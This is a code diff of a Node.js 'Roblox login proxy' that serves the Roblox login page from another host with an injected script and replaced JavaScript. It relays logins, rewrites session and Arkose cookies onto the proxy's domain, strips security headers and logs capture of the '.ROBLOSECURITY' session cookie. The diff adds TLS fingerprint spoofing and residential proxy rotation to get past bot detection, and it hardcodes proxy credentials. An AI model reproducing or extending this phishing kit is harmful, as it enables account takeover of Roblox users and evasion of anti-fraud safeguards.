@@ -14,11 +14,11 @@ console.log('🔒 ROBLOX LOGIN PROXY');
 console.log('='.repeat(60));
 
 // ─────────────────────────────────────────────────────────────
-// CURL-IMPERSONATE (for Arkose Labs TLS fingerprint)
+// CURL-IMPERSONATE (for ALL requests - TLS fingerprint spoofing)
 // ─────────────────────────────────────────────────────────────
 let CURL_BIN = 'curl';
 function detectCurlBin() {
-    const candidates = ['curl_chrome124', 'curl_chrome120', 'curl-impersonate-chrome', 'curl'];
+    const candidates = ['curl_chrome124', 'curl_chrome120', 'curl_chrome116', 'curl-impersonate-chrome', 'curl'];
     let idx = 0;
     function tryNext() {
         if (idx >= candidates.length) return;
@@ -39,7 +39,7 @@ function detectCurlBin() {
 detectCurlBin();
 
 // ─────────────────────────────────────────────────────────────
-// RESIDENTIAL PROXIES (for Arkose Labs)
+// RESIDENTIAL PROXIES (optional - for additional IP rotation)
 // ─────────────────────────────────────────────────────────────
 const RESIDENTIAL_PROXIES = [
     'http://104574_FmGRR_s_1KB03APR4ILFSCMW:HoxFFU3jQA@residential.pingproxies.com:8872',
@@ -56,11 +56,11 @@ function getNextProxy() {
 }
 
 // ─────────────────────────────────────────────────────────────
-// SHARED AGENTS
+// SHARED AGENTS (fallback only)
 // ─────────────────────────────────────────────────────────────
 const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 50, timeout: 30000 });
 
-const BROWSER_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36';
+const BROWSER_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';
 
 const CHALLENGE_HEADERS = [
     'rblx-challenge-id',
@@ -71,8 +71,6 @@ const CHALLENGE_HEADERS = [
 
 // ─────────────────────────────────────────────────────────────
 // SERVE MODIFIED JS FILES
-// Place EnvironmentUrls.js, CoreUtilities.js, Challenge.js,
-// ReactLogin.js inside /modified-js folder next to index.js
 // ─────────────────────────────────────────────────────────────
 app.use('/js', express.static(path.join(__dirname, 'modified-js')));
 
@@ -93,6 +91,8 @@ function rewriteCookies(cookies, host) {
     const cleanHost = host.replace(/^www\./, '');
     return cookies.map(c =>
         c.replace(/Domain=\.?roblox\.com/gi, `Domain=.${cleanHost}`)
+         .replace(/Domain=\.?rbxcdn\.com/gi, `Domain=.${cleanHost}`)
+         .replace(/Domain=\.?arkoselabs\.com/gi, `Domain=.${cleanHost}`)
          .replace(/Domain=\.?rbxcdn\.com/gi, `Domain=.${cleanHost}`)
          .replace(/\bSecure\b/gi, 'Secure; SameSite=None')
     );
@@ -139,56 +139,152 @@ app.options('*', (req, res) => {
 });
 
 // ─────────────────────────────────────────────────────────────
-// LOGIN HANDLER  (/v2/login and /v3/login)
-// Handles CSRF dance + challenge headers manually
+// CURL-IMPERSONATE REQUEST FUNCTION (for ALL requests)
 // ─────────────────────────────────────────────────────────────
-function doLoginRequest(bodyStr, cookieHeader, csrfToken, ua, extraHeaders) {
+function makeCurlRequest(method, url, headers, body, useProxy = false) {
     return new Promise((resolve, reject) => {
-        const bodyBuf = Buffer.from(bodyStr, 'utf8');
-        const headers = {
-            'Content-Type':    'application/json;charset=UTF-8',
-            'Content-Length':  bodyBuf.length,
-            'Accept':          'application/json, text/plain, */*',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Origin':          'https://www.roblox.com',
-            'Referer':         'https://www.roblox.com/login',
-            'User-Agent':      ua || BROWSER_UA,
-            'Connection':      'keep-alive',
-        };
-        const forward = ['rbx-device-id', 'rbxdeviceid', 'x-bound-auth-token', ...CHALLENGE_HEADERS];
-        for (const h of forward) {
-            if (extraHeaders[h]) headers[h] = extraHeaders[h];
-        }
-        if (cookieHeader) headers['Cookie']       = cookieHeader;
-        if (csrfToken)    headers['X-CSRF-TOKEN'] = csrfToken;
+        const args = [
+            '--silent', '--include', '--max-time', '45',
+            '--http2', '--compressed',
+            '-X', method.toUpperCase()
+        ];
 
-        const req = https.request({
-            hostname: 'auth.roblox.com',
-            path:     '/v2/login',
-            method:   'POST',
-            headers,
-            agent:    httpsAgent,
-        }, (res) => {
-            let data = '';
-            res.on('data', c => data += c);
-            res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data }));
+        // Add optional proxy
+        if (useProxy) {
+            const proxyUrl = getNextProxy();
+            args.push('-x', proxyUrl);
+        }
+
+        // Add headers (skip ones curl handles automatically)
+        const skipHeaders = new Set([
+            'host', 'content-length', 'transfer-encoding',
+            'connection', 'accept-encoding', 'user-agent'
+        ]);
+
+        for (const [k, v] of Object.entries(headers)) {
+            if (!skipHeaders.has(k.toLowerCase())) {
+                args.push('-H', `${k}: ${v}`);
+            }
+        }
+
+        // Add User-Agent if provided
+        if (headers['user-agent']) {
+            args.push('-H', `User-Agent: ${headers['user-agent']}`);
+        }
+
+        // Add body for POST/PUT/PATCH
+        if (body && body.length > 0) {
+            args.push('--data-binary', '@-');
+        }
+
+        args.push(url);
+
+        const child = spawn(CURL_BIN, args, { timeout: 50000 });
+
+        if (body && body.length > 0) {
+            child.stdin.write(body);
+        }
+        child.stdin.end();
+
+        const chunks = [];
+        let stderr = '';
+
+        child.stdout.on('data', c => chunks.push(c));
+        child.stderr.on('data', c => { stderr += c.toString(); });
+
+        child.on('error', (err) => {
+            reject(new Error(`curl spawn error: ${err.message}`));
         });
-        req.on('error', reject);
-        req.write(bodyBuf);
-        req.end();
+
+        child.on('close', (code) => {
+            if (code !== 0 && code !== null) {
+                return reject(new Error(`curl exited with code ${code}. stderr: ${stderr}`));
+            }
+
+            const buf = Buffer.concat(chunks);
+            const raw = buf.toString('binary');
+
+            // Find the last HTTP response (handle redirects)
+            const httpRe = /HTTP\/[^\s]+\s+\d+/g;
+            let lastMatch = null, m;
+            while ((m = httpRe.exec(raw)) !== null) lastMatch = m;
+
+            if (!lastMatch) {
+                return reject(new Error(`No HTTP response found. stderr: ${stderr}`));
+            }
+
+            const hdrStart = lastMatch.index;
+            const hdrEnd = raw.indexOf('\r\n\r\n', hdrStart);
+
+            if (hdrEnd === -1) {
+                return reject(new Error('Malformed HTTP response - no header end'));
+            }
+
+            const statusLine = raw.substring(hdrStart, raw.indexOf('\r\n', hdrStart));
+            const statusCode = parseInt(statusLine.match(/\d{3}/)?.[0] || '0', 10);
+
+            // Parse headers
+            const parsedHdrs = {};
+            const headerLines = raw.substring(hdrStart, hdrEnd).split('\r\n').slice(1);
+            for (const line of headerLines) {
+                const ci = line.indexOf(':');
+                if (ci < 1) continue;
+                const k = line.substring(0, ci).trim().toLowerCase();
+                const v = line.substring(ci + 1).trim();
+                if (parsedHdrs[k] !== undefined) {
+                    parsedHdrs[k] = Array.isArray(parsedHdrs[k])
+                        ? [...parsedHdrs[k], v]
+                        : [parsedHdrs[k], v];
+                } else {
+                    parsedHdrs[k] = v;
+                }
+            }
+
+            const responseBody = buf.slice(hdrEnd + 4);
+            resolve({ statusCode, headers: parsedHdrs, body: responseBody });
+        });
     });
 }
 
-async function doLoginWithRetry(bodyStr, cookie, csrf, ua, extra, maxRetries = 2) {
+// ─────────────────────────────────────────────────────────────
+// LOGIN HANDLER (/v2/login and /v3/login)
+// Uses curl-impersonate for TLS fingerprint spoofing
+// ─────────────────────────────────────────────────────────────
+async function doLoginRequest(bodyStr, cookieHeader, csrfToken, ua, extraHeaders, useProxy = false) {
+    const headers = {
+        'Content-Type':    'application/json;charset=UTF-8',
+        'Accept':          'application/json, text/plain, */*',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Origin':          'https://www.roblox.com',
+        'Referer':         'https://www.roblox.com/login',
+        'User-Agent':      ua || BROWSER_UA,
+    };
+
+    const forward = ['rbx-device-id', 'rbxdeviceid', 'x-bound-auth-token', ...CHALLENGE_HEADERS];
+    for (const h of forward) {
+        if (extraHeaders[h]) headers[h] = extraHeaders[h];
+    }
+
+    if (cookieHeader) headers['Cookie'] = cookieHeader;
+    if (csrfToken)    headers['X-CSRF-TOKEN'] = csrfToken;
+
+    const url = 'https://auth.roblox.com/v2/login';
+    const body = Buffer.from(bodyStr, 'utf8');
+
+    return await makeCurlRequest('POST', url, headers, body, useProxy);
+}
+
+async function doLoginWithRetry(bodyStr, cookie, csrf, ua, extra, maxRetries = 3) {
     let lastErr;
     for (let i = 0; i <= maxRetries; i++) {
-        try { return await doLoginRequest(bodyStr, cookie, csrf, ua, extra); }
-        catch (e) {
+        try {
+            // Try without proxy first, then with proxy on retries
+            const useProxy = i > 0;
+            return await doLoginRequest(bodyStr, cookie, csrf, ua, extra, useProxy);
+        } catch (e) {
             lastErr = e;
-            if (['ECONNRESET','ETIMEDOUT','ECONNREFUSED'].includes(e.code)) {
-                await new Promise(r => setTimeout(r, 500 * (i + 1)));
-            } else throw e;
+            console.log(`   Retry ${i + 1}/${maxRetries + 1}: ${e.message}`);
+            await new Promise(r => setTimeout(r, 500 * (i + 1)));
         }
     }
     throw lastErr;
@@ -206,11 +302,13 @@ function forwardLoginResponse(res, result, host, origin, deviceId) {
     if (deviceId) cookies.push(`rbx-device-id=${deviceId}; Domain=.${cleanHost}; Path=/; Secure; SameSite=None`);
     if (cookies.length) res.set('Set-Cookie', cookies);
 
-    const hasRoblo = (result.headers['set-cookie'] || []).some(c => c.includes('.ROBLOSECURITY'));
+    const hasRoblo = (result.headers['set-cookie'] || []).some(c =>
+        Array.isArray(c) ? c.some(sc => sc.includes('.ROBLOSECURITY')) : c.includes('.ROBLOSECURITY')
+    );
     if (hasRoblo) console.log('✅ .ROBLOSECURITY received — login success!');
-    else if (result.status === 200) console.log('⚠️  200 but no .ROBLOSECURITY');
+    else if (result.statusCode === 200) console.log('⚠️  200 but no .ROBLOSECURITY');
 
-    res.status(result.status).send(result.body);
+    res.status(result.statusCode).send(result.body);
 }
 
 async function loginHandler(req, res) {
@@ -223,7 +321,7 @@ async function loginHandler(req, res) {
     const deviceId = getDeviceId(req);
 
     const hasChallenge = !!(req.headers['rblx-challenge-metadata'] && req.headers['rblx-challenge-id']);
-    console.log(`🔑 LOGIN | Challenge: ${hasChallenge ? 'YES' : 'NO'}`);
+    console.log(`🔑 LOGIN | Challenge: ${hasChallenge ? 'YES' : 'NO'} | curl: ${CURL_BIN}`);
 
     try {
         const bodyStr = req.body.toString('utf8');
@@ -231,10 +329,10 @@ async function loginHandler(req, res) {
         // If browser already has challenge solution, send it directly
         if (hasChallenge) {
             let result = await doLoginWithRetry(bodyStr, cookies, null, ua, req.headers);
-            if (result.status === 403 && result.headers['x-csrf-token']) {
+            if (result.statusCode === 403 && result.headers['x-csrf-token']) {
                 let cookieHeader = cookies;
                 if (result.headers['set-cookie']) {
-                    const extra = result.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
+                    const extra = [].concat(result.headers['set-cookie']).map(c => c.split(';')[0]).join('; ');
                     cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
                 }
                 result = await doLoginWithRetry(bodyStr, cookieHeader, result.headers['x-csrf-token'], ua, req.headers);
@@ -244,32 +342,32 @@ async function loginHandler(req, res) {
 
         // Step 1: get CSRF token
         const step1 = await doLoginWithRetry(bodyStr, cookies, null, ua, req.headers);
-        console.log(`   Step 1: ${step1.status}`);
+        console.log(`   Step 1: ${step1.statusCode}`);
         if (!step1.headers['x-csrf-token']) return forwardLoginResponse(res, step1, host, origin, deviceId);
 
         // Step 2: retry with CSRF
         let cookieHeader = cookies;
         if (step1.headers['set-cookie']) {
-            const extra = step1.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
+            const extra = [].concat(step1.headers['set-cookie']).map(c => c.split(';')[0]).join('; ');
             cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
         }
         const step2 = await doLoginWithRetry(bodyStr, cookieHeader, step1.headers['x-csrf-token'], ua, req.headers);
-        console.log(`   Step 2: ${step2.status}`);
+        console.log(`   Step 2: ${step2.statusCode}`);
 
         // Step 3: if token rotated, retry once more
         let final = step2;
-        if (step2.status === 403 && step2.headers['x-csrf-token'] && step2.headers['x-csrf-token'] !== step1.headers['x-csrf-token']) {
+        if (step2.statusCode === 403 && step2.headers['x-csrf-token'] && step2.headers['x-csrf-token'] !== step1.headers['x-csrf-token']) {
             if (step2.headers['set-cookie']) {
-                const extra = step2.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
+                const extra = [].concat(step2.headers['set-cookie']).map(c => c.split(';')[0]).join('; ');
                 cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
             }
             final = await doLoginWithRetry(bodyStr, cookieHeader, step2.headers['x-csrf-token'], ua, req.headers);
-            console.log(`   Step 3: ${final.status}`);
+            console.log(`   Step 3: ${final.statusCode}`);
         }
 
-        if (final.status === 200) console.log('✅ LOGIN SUCCESS');
+        if (final.statusCode === 200) console.log('✅ LOGIN SUCCESS');
         else if (final.headers['rblx-challenge-id']) console.log('🧩 Challenge required');
-        else console.log(`❌ Login failed: ${final.status}`);
+        else console.log(`❌ Login failed: ${final.statusCode}`);
 
         forwardLoginResponse(res, final, host, origin, deviceId);
 
@@ -283,76 +381,56 @@ app.use('/v2/login', express.raw({ type: '*/*' }), loginHandler);
 app.use('/v3/login', express.raw({ type: '*/*' }), loginHandler);
 
 // ─────────────────────────────────────────────────────────────
-// ARKOSE LABS — curl-impersonate proxy
+// UNIVERSAL CURL-IMPERSONATE PROXY (for ALL API routes)
+// Replaces the standard http-proxy-middleware for API routes
 // ─────────────────────────────────────────────────────────────
-function makeArkoseRequest(method, url, outHeaders, proxyUrl, body) {
-    return new Promise((resolve, reject) => {
-        const args = ['--silent', '--include', '--max-time', '30', '--http2', '--compressed', '-X', method.toUpperCase()];
-        if (proxyUrl) args.push('-x', proxyUrl);
-
-        const skip = new Set(['host', 'content-length', 'transfer-encoding', 'connection', 'accept-encoding']);
-        for (const [k, v] of Object.entries(outHeaders)) {
-            if (!skip.has(k.toLowerCase())) args.push('-H', `${k}: ${v}`);
-        }
-        if (body && body.length > 0) args.push('--data-binary', '@-');
-        args.push(url);
-
-        const child = spawn(CURL_BIN, args, { timeout: 35000 });
-        if (body && body.length > 0) { child.stdin.write(body); }
-        child.stdin.end();
-
-        const chunks = [];
-        let stderr = '';
-        child.stdout.on('data', c => chunks.push(c));
-        child.stderr.on('data', c => { stderr += c.toString(); });
-        child.on('error', reject);
-        child.on('close', () => {
-            const buf = Buffer.concat(chunks);
-            const raw = buf.toString('binary');
-            const httpRe = /HTTP\/[\d.]+ \d+[^\r\n]*/g;
-            let lastMatch = null, m;
-            while ((m = httpRe.exec(raw)) !== null) lastMatch = m;
-            if (!lastMatch) return reject(new Error(`curl exit — no HTTP response. stderr: ${stderr}`));
-
-            const hdrStart = lastMatch.index;
-            const hdrEnd   = raw.indexOf('\r\n\r\n', hdrStart);
-            if (hdrEnd === -1) return reject(new Error('No end of headers'));
-
-            const statusCode = parseInt(lastMatch[0].match(/\d{3}/)[0], 10);
-            const parsedHdrs = {};
-            for (const line of raw.substring(hdrStart, hdrEnd).split('\r\n').slice(1)) {
-                const ci = line.indexOf(':');
-                if (ci < 1) continue;
-                const k = line.substring(0, ci).trim().toLowerCase();
-                const v = line.substring(ci + 1).trim();
-                parsedHdrs[k] = parsedHdrs[k] !== undefined ? [].concat(parsedHdrs[k], v) : v;
-            }
-            resolve({ statusCode, headers: parsedHdrs, body: buf.slice(hdrEnd + 4) });
-        });
-    });
-}
-
-function createArkoseProxy(target) {
-    const arkoseOrigin = target.replace(/\/+$/, '');
+function createCurlProxy(targetHost, pathPrefix, useResidentialProxy = false) {
     return async (req, res) => {
         const origin = req.headers['origin'] || `https://${req.headers.host}`;
         setCors(res, origin);
 
-        const qs        = req.url.includes('?') ? req.url.slice(req.url.indexOf('?')) : '';
-        const targetUrl = `${arkoseOrigin}${req.path}${qs}`;
-        const outHeaders = {
-            'Origin':          arkoseOrigin,
-            'Referer':         `${arkoseOrigin}/`,
+        // Build target URL
+        let targetPath = req.path;
+        if (pathPrefix) {
+            targetPath = pathPrefix + req.path;
+        }
+        const qs = req.url.includes('?') ? req.url.slice(req.url.indexOf('?')) : '';
+        const targetUrl = `https://${targetHost}${targetPath}${qs}`;
+
+        // Build headers
+        const headers = {
+            'Origin':          'https://www.roblox.com',
+            'Referer':         'https://www.roblox.com/login',
             'User-Agent':      req.headers['user-agent'] || BROWSER_UA,
-            'Accept':          req.headers['accept'] || '*/*',
+            'Accept':          req.headers['accept'] || 'application/json, text/plain, */*',
             'Accept-Language': 'en-US,en;q=0.9',
         };
-        if (req.headers['content-type']) outHeaders['Content-Type'] = req.headers['content-type'];
-        for (const h of CHALLENGE_HEADERS) { if (req.headers[h]) outHeaders[h] = req.headers[h]; }
 
+        if (req.headers['content-type']) {
+            headers['Content-Type'] = req.headers['content-type'];
+        }
+        if (req.headers['cookie']) {
+            headers['Cookie'] = req.headers['cookie'];
+        }
+        if (req.headers['x-csrf-token']) {
+            headers['X-CSRF-Token'] = req.headers['x-csrf-token'];
+        }
+        if (req.headers['rbx-device-id']) {
+            headers['rbx-device-id'] = req.headers['rbx-device-id'];
+        }
+        if (req.headers['x-bound-auth-token']) {
+            headers['x-bound-auth-token'] = req.headers['x-bound-auth-token'];
+        }
+
+        // Forward challenge headers
+        for (const h of CHALLENGE_HEADERS) {
+            if (req.headers[h]) headers[h] = req.headers[h];
+        }
+
+        // Get body for POST/PUT/PATCH
         let body = null;
-        if (['POST','PUT','PATCH'].includes(req.method.toUpperCase())) {
-            body = await new Promise(resolve => {
+        if (['POST', 'PUT', 'PATCH'].includes(req.method.toUpperCase())) {
+            body = await new Promise((resolve) => {
                 const bufs = [];
                 req.on('data', c => bufs.push(c));
                 req.on('end', () => resolve(Buffer.concat(bufs)));
@@ -360,76 +438,47 @@ function createArkoseProxy(target) {
         }
 
         try {
-            const result = await makeArkoseRequest(req.method, targetUrl, outHeaders, getNextProxy(), body);
+            const result = await makeCurlRequest(
+                req.method,
+                targetUrl,
+                headers,
+                body,
+                useResidentialProxy
+            );
+
+            // Forward response headers
             const skipHdrs = new Set([
                 'content-security-policy', 'content-security-policy-report-only',
-                'x-content-security-policy', 'transfer-encoding', 'connection', 'content-encoding'
+                'x-content-security-policy', 'transfer-encoding', 'connection',
+                'content-encoding', 'keep-alive', 'proxy-authenticate',
+                'proxy-authorization', 'te', 'trailers', 'upgrade'
             ]);
+
             for (const [k, v] of Object.entries(result.headers)) {
                 if (skipHdrs.has(k)) continue;
-                if (k === 'set-cookie') res.set('Set-Cookie', rewriteCookies([].concat(v), req.headers.host || 'localhost'));
-                else try { res.set(k, v); } catch (_) {}
+                if (k === 'set-cookie') {
+                    res.set('Set-Cookie', rewriteCookies([].concat(v), req.headers.host || 'localhost'));
+                } else {
+                    try { res.set(k, v); } catch (_) {}
+                }
             }
+
             res.status(result.statusCode).send(result.body);
+
         } catch (err) {
-            console.error(`[arkose] ❌ ${err.message}`);
-            if (!res.headersSent) res.status(502).json({ error: 'Arkose proxy error', message: err.message });
+            console.error(`[curl-proxy:${targetHost}] ❌ ${req.method} ${req.path} | ${err.message}`);
+            if (!res.headersSent) {
+                res.status(502).json({ error: 'Proxy error', message: err.message });
+            }
         }
     };
 }
 
 // ─────────────────────────────────────────────────────────────
-// STANDARD API PROXY FACTORY
-// ─────────────────────────────────────────────────────────────
-function createApiProxy(target, pathPrefix) {
-    return createProxyMiddleware({
-        target: `https://${target}`,
-        changeOrigin: true,
-        secure: true,
-        proxyTimeout: 30000,
-        timeout: 30000,
-        agent: httpsAgent,
-        pathRewrite: pathPrefix ? (path) => pathPrefix + path : undefined,
-        on: {
-            proxyReq: (proxyReq, req) => {
-                try {
-                    proxyReq.setHeader('origin',          'https://www.roblox.com');
-                    proxyReq.setHeader('referer',         'https://www.roblox.com/login');
-                    proxyReq.setHeader('user-agent',      req.headers['user-agent'] || BROWSER_UA);
-                    proxyReq.setHeader('accept-language', 'en-US,en;q=0.9');
-                    proxyReq.setHeader('accept-encoding', 'gzip, deflate, br');
-                    if (req.headers['x-csrf-token'])       proxyReq.setHeader('x-csrf-token',       req.headers['x-csrf-token']);
-                    if (req.headers['rbx-device-id'])      proxyReq.setHeader('rbx-device-id',      req.headers['rbx-device-id']);
-                    if (req.headers['x-bound-auth-token']) proxyReq.setHeader('x-bound-auth-token', req.headers['x-bound-auth-token']);
-                    for (const h of CHALLENGE_HEADERS) { if (req.headers[h]) proxyReq.setHeader(h, req.headers[h]); }
-                } catch (e) { if (e.code !== 'ERR_HTTP_HEADERS_SENT') throw e; }
-            },
-            proxyRes: (proxyRes, req) => {
-                delete proxyRes.headers['content-security-policy'];
-                delete proxyRes.headers['content-security-policy-report-only'];
-                delete proxyRes.headers['x-content-security-policy'];
-                const origin = req.headers['origin'] || `https://${req.headers.host}`;
-                proxyRes.headers['access-control-allow-origin']      = origin;
-                proxyRes.headers['access-control-allow-credentials'] = 'true';
-                proxyRes.headers['access-control-expose-headers']    = ['x-csrf-token', ...CHALLENGE_HEADERS].join(', ');
-                if (proxyRes.headers['set-cookie']) {
-                    proxyRes.headers['set-cookie'] = rewriteCookies(proxyRes.headers['set-cookie'], req.headers.host || 'localhost');
-                }
-            },
-            error: (err, req, res) => {
-                console.error(`[api:${target}] ❌ ${req.method} ${req.path} | ${err.code}: ${err.message}`);
-                if (!res.headersSent) res.status(502).json({ error: 'Proxy error', code: err.code });
-            }
-        }
-    });
-}
-
-// ─────────────────────────────────────────────────────────────
 // ROUTE MAP
-// Order matters — more specific paths must come first
 // ─────────────────────────────────────────────────────────────
 
-// Arkose Labs — curl-impersonate with residential proxy
+// Arkose Labs — curl-impersonate with residential proxy (high security)
 const ARKOSE_ROUTES = [
     ['/arkose-api',     'https://roblox-api.arkoselabs.com'],
     ['/arkose-client',  'https://client-api.arkoselabs.com'],
@@ -442,29 +491,26 @@ const ARKOSE_ROUTES = [
     ['/apis-rbxcdn',    'https://apis.rbxcdn.com'],
 ];
 
-// Standard Roblox API routes
-// These match what location.origin resolves to in their EnvironmentUrls.js
-// Format: [routePrefix, target, pathPrefixToRestore?]
-// Services with NXDOMAIN subdomains are routed via apis.roblox.com gateway
+// Standard Roblox API routes — NOW USING CURL-IMPERSONATE
 const API_ROUTES = [
     // Challenge system (critical for login)
     ['/challenge',                        'apis.roblox.com'],
-    ['/account-security-service',         'apis.roblox.com',                        '/account-security-service'],
-    ['/proof-of-work-service',            'apis.roblox.com',                        '/proof-of-work-service'],
-    ['/auth-token-service',               'apis.roblox.com',                        '/auth-token-service'],
-    ['/hba-service',                      'apis.roblox.com',                        '/hba-service'],
-    ['/rotating-client-service',          'apis.roblox.com',                        '/rotating-client-service'],
+    ['/account-security-service',         'apis.roblox.com', '/account-security-service'],
+    ['/proof-of-work-service',            'apis.roblox.com', '/proof-of-work-service'],
+    ['/auth-token-service',               'apis.roblox.com', '/auth-token-service'],
+    ['/hba-service',                      'apis.roblox.com', '/hba-service'],
+    ['/rotating-client-service',          'apis.roblox.com', '/rotating-client-service'],
 
     // Experimentation & config
-    ['/product-experimentation-platform', 'apis.roblox.com',                        '/product-experimentation-platform'],
+    ['/product-experimentation-platform', 'apis.roblox.com', '/product-experimentation-platform'],
     ['/universal-app-configuration',      'apis.roblox.com'],
-    ['/guac-v2',                          'apis.roblox.com',                        '/guac-v2'],
+    ['/guac-v2',                          'apis.roblox.com', '/guac-v2'],
 
     // OTP & captcha
-    ['/otp-service',                      'apis.roblox.com',                        '/otp-service'],
+    ['/otp-service',                      'apis.roblox.com', '/otp-service'],
     ['/captcha',                          'apis.roblox.com'],
 
-    // Core APIs via location.origin
+    // Core APIs
     ['/v1/account-information',           'accountinformation.roblox.com'],
     ['/v2/account-information',           'accountinformation.roblox.com'],
     ['/v1/users',                         'users.roblox.com'],
@@ -488,6 +534,10 @@ const API_ROUTES = [
     ['/v1/games',                         'games.roblox.com'],
     ['/v2/games',                         'games.roblox.com'],
 
+    // Behaviors endpoints
+    ['/v1/behaviors',                     'apis.roblox.com', '/v1/behaviors'],
+    ['/v1/metadata',                      'apis.roblox.com', '/v1/metadata'],
+
     // Reporting (non-critical)
     ['/game/report-event',                'www.roblox.com'],
     ['/ecsv2-api',                        'ecsv2.roblox.com'],
@@ -495,19 +545,19 @@ const API_ROUTES = [
     ['/ephemeralcounters',                'ephemeralcounters.roblox.com'],
 ];
 
-// Register Arkose routes
+// Register Arkose routes with residential proxy
 for (const [prefix, target] of ARKOSE_ROUTES) {
-    app.use(prefix, createArkoseProxy(target));
+    const targetHost = target.replace(/^https?:\/\//, '').replace(/\/+$/, '');
+    app.use(prefix, createCurlProxy(targetHost, '', true)); // use residential proxy
 }
 
-// Register API routes
+// Register API routes with curl-impersonate (no residential proxy by default)
 for (const [prefix, target, pathPrefix] of API_ROUTES) {
-    app.use(prefix, createApiProxy(target, pathPrefix));
+    app.use(prefix, createCurlProxy(target, pathPrefix, false));
 }
 
 // ─────────────────────────────────────────────────────────────
 // INJECTED SCRIPT
-// Keeps credentials on all requests, tracks challenge state
 // ─────────────────────────────────────────────────────────────
 const INJECTED_SCRIPT = `<script>
 (function() {
@@ -549,8 +599,6 @@ const INJECTED_SCRIPT = `<script>
 
 // ─────────────────────────────────────────────────────────────
 // MAIN PAGE HANDLER
-// Serves Roblox login page with injected meta tags + script
-// CSS/JS CDN loaded directly by browser — not proxied
 // ─────────────────────────────────────────────────────────────
 app.use('/', createProxyMiddleware({
     target: 'https://www.roblox.com',
@@ -636,4 +684,5 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Proxy running on port ${PORT}`);
     console.log(`📁 Modified JS from: ${path.join(__dirname, 'modified-js')}`);
     console.log(`📋 ${API_ROUTES.length} API routes | ${ARKOSE_ROUTES.length} Arkose routes`);
+    console.log(`🔒 ALL requests now use curl-impersonate for TLS fingerprint spoofing`);
 });
